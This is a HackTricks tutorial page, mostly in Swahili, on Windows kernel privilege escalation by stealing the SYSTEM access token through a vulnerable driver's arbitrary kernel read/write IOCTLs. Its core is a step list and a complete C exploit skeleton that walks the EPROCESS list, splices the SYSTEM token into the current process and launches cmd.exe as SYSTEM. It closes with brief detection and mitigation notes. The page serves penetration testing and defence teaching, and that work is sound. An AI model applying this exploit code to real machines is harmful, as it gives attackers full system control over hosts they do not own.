# Windows kernel EoP: Token stealing with arbitrary kernel R/W

{{#include ../../banners/hacktricks-training.md}}

## Muhtasari

Ikiwa driver iliyo hatarini ina IOCTL inayomruhusu mshambuliaji arbitrary kernel read and/or write primitives, kuinua haki hadi NT AUTHORITY\SYSTEM mara nyingi hufanikiwa kwa kuiba SYSTEM access token. Mbinu inakopa pointer ya Token kutoka EPROCESS ya mchakato wa SYSTEM na kuiweka kwenye EPROCESS ya mchakato wa sasa.

Kwa nini inafanya kazi:
- Kila mchakato una muundo wa EPROCESS ambao una (miongoni mwa mashamba mengine) Token (kibinadamu ni EX_FAST_REF kwa token object).
- Mchakato wa SYSTEM (PID 4) una token yenye haki zote zikiwa zimewezeshwa.
- Kubadilisha EPROCESS.Token ya mchakato wa sasa na pointer ya token ya SYSTEM hufanya mchakato wa sasa uendeshe kama SYSTEM mara moja.

> Offsets kwenye EPROCESS zinatofautiana kati ya matoleo ya Windows. Ziagilie kwa njia ya dynamic (symbols) au tumia constants za toleo maalum. Pia kumbuka kwamba EPROCESS.Token ni EX_FAST_REF (viga vya chini 3 ni bendera za reference count).

## Hatua za juu

1) Pata ntoskrnl.exe base na ufute anwani ya PsInitialSystemProcess.
- Kutoka user mode, tumia NtQuerySystemInformation(SystemModuleInformation) au EnumDeviceDrivers kupata driver bases zilizosomwa.
- Ongeza offset ya PsInitialSystemProcess (kutokana na symbols/reversing) kwenye kernel base kupata anwani yake.
2) Soma pointer kwenye PsInitialSystemProcess → hii ni pointer ya kernel kwenda EPROCESS ya SYSTEM.
3) Kutoka EPROCESS ya SYSTEM, soma offsets za UniqueProcessId na ActiveProcessLinks ili kupitia linked list ya EPROCESS (ActiveProcessLinks.Flink/Blink) hadi utakapopata EPROCESS ambayo UniqueProcessId inalingana na GetCurrentProcessId(). Hifadhi zote:
- EPROCESS_SYSTEM (kwa SYSTEM)
- EPROCESS_SELF (kwa mchakato wa sasa)
4) Soma thamani ya token ya SYSTEM: Token_SYS = *(EPROCESS_SYSTEM + TokenOffset).
- Ondoa bits za chini 3: Token_SYS_masked = Token_SYS & ~0xF (kwa kawaida ~0xF au ~0x7 kutegemea build; kwenye x64 bits za chini 3 zinatumika — 0xFFFFFFFFFFFFFFF8 mask).
5) Chaguo A (kawaida): Hifadhi bits za chini 3 kutoka token yako ya sasa na uziunganishe kwenye pointer ya SYSTEM ili kuweka reference count iliyojengwa kuwa thabiti.
- Token_ME = *(EPROCESS_SELF + TokenOffset)
- Token_NEW = (Token_SYS_masked | (Token_ME & 0x7))
6) Andika Token_NEW tena kwenye (EPROCESS_SELF + TokenOffset) ukitumia kernel write primitive yako.
7) Mchakato wako wa sasa sasa ni SYSTEM. Hiari, anzisha cmd.exe mpya au powershell.exe kuthibitisha.

## Pseudocode

Below is a skeleton that only uses two IOCTLs from a vulnerable driver, one for 8-byte kernel read and one for 8-byte kernel write. Replace with your driver’s interface.
```c
#include <Windows.h>
#include <Psapi.h>
#include <stdint.h>

// Device + IOCTLs are driver-specific
#define DEV_PATH   "\\\\.\\VulnDrv"
#define IOCTL_KREAD  CTL_CODE(FILE_DEVICE_UNKNOWN, 0x801, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define IOCTL_KWRITE CTL_CODE(FILE_DEVICE_UNKNOWN, 0x802, METHOD_BUFFERED, FILE_ANY_ACCESS)

// Version-specific (examples only – resolve per build!)
static const uint32_t Off_EPROCESS_UniquePid    = 0x448; // varies
static const uint32_t Off_EPROCESS_Token        = 0x4b8; // varies
static const uint32_t Off_EPROCESS_ActiveLinks  = 0x448 + 0x8; // often UniquePid+8, varies

BOOL kread_qword(HANDLE h, uint64_t kaddr, uint64_t *out) {
struct { uint64_t addr; } in; struct { uint64_t val; } outb; DWORD ret;
in.addr = kaddr; return DeviceIoControl(h, IOCTL_KREAD, &in, sizeof(in), &outb, sizeof(outb), &ret, NULL) && (*out = outb.val, TRUE);
}
BOOL kwrite_qword(HANDLE h, uint64_t kaddr, uint64_t val) {
struct { uint64_t addr, val; } in; DWORD ret;
in.addr = kaddr; in.val = val; return DeviceIoControl(h, IOCTL_KWRITE, &in, sizeof(in), NULL, 0, &ret, NULL);
}

// Get ntoskrnl base (one option)
uint64_t get_nt_base(void) {
LPVOID drivers[1024]; DWORD cbNeeded;
if (EnumDeviceDrivers(drivers, sizeof(drivers), &cbNeeded) && cbNeeded >= sizeof(LPVOID)) {
return (uint64_t)drivers[0]; // first is typically ntoskrnl
}
return 0;
}

int main(void) {
HANDLE h = CreateFileA(DEV_PATH, GENERIC_READ|GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
if (h == INVALID_HANDLE_VALUE) return 1;

// 1) Resolve PsInitialSystemProcess
uint64_t nt = get_nt_base();
uint64_t PsInitialSystemProcess = nt + /*offset of symbol*/ 0xDEADBEEF; // resolve per build

// 2) Read SYSTEM EPROCESS
uint64_t EPROC_SYS; kread_qword(h, PsInitialSystemProcess, &EPROC_SYS);

// 3) Walk ActiveProcessLinks to find current EPROCESS
DWORD myPid = GetCurrentProcessId();
uint64_t cur = EPROC_SYS; // list is circular
uint64_t EPROC_ME = 0;
do {
uint64_t pid; kread_qword(h, cur + Off_EPROCESS_UniquePid, &pid);
if ((DWORD)pid == myPid) { EPROC_ME = cur; break; }
uint64_t flink; kread_qword(h, cur + Off_EPROCESS_ActiveLinks, &flink);
cur = flink - Off_EPROCESS_ActiveLinks; // CONTAINING_RECORD
} while (cur != EPROC_SYS);

// 4) Read tokens
uint64_t tok_sys, tok_me;
kread_qword(h, EPROC_SYS + Off_EPROCESS_Token, &tok_sys);
kread_qword(h, EPROC_ME  + Off_EPROCESS_Token, &tok_me);

// 5) Mask EX_FAST_REF low bits and splice refcount bits
uint64_t tok_sys_mask = tok_sys & ~0xF; // or ~0x7 on some builds
uint64_t tok_new = tok_sys_mask | (tok_me & 0x7);

// 6) Write back
kwrite_qword(h, EPROC_ME + Off_EPROCESS_Token, tok_new);

// 7) We are SYSTEM now
system("cmd.exe");
return 0;
}
```
Vidokezo:
- Ofseti: Tumia WinDbg’s `dt nt!_EPROCESS` pamoja na PDBs za lengo, au runtime symbol loader, kupata ofseti sahihi. Usiyaharcode bila kufikiri.
- Mask: Kwenye x64 token ni EX_FAST_REF; low 3 bits ni reference count bits. Kuhifadhi low bits za asili kutoka kwa token yako kunazuia inconsistent refcount mara moja.
- Utulivu: Pendelea kuinua mchakato wa sasa; ikiwa utaelevate helper mfupi-muda unaweza kupoteza SYSTEM anapoondoka.

## Utambuzi & mitigation
- Kupakia madereva ya third‑party yasiyotiwa saini au yasiyothibitishwa yanayofunua IOCTLs zenye nguvu ndicho chanzo kikuu.
- Kernel Driver Blocklist (HVCI/CI), DeviceGuard, and Attack Surface Reduction rules zinaweza kuzuia madereva yaliyo hatarishi kupakia.
- EDR inaweza kusubiri mfululizo wa suspicious IOCTLs ambazo zinaimplement arbitrary read/write na token swaps.

## References
- [HTB Reaper: Format-string leak + stack BOF → VirtualAlloc ROP (RCE) and kernel token theft](https://0xdf.gitlab.io/2025/08/26/htb-reaper.html)
- [FuzzySecurity – Windows Kernel ExploitDev (token stealing examples)](https://www.fuzzysecurity.com/tutorials/expDev/17.html)

{{#include ../../banners/hacktricks-training.md}}
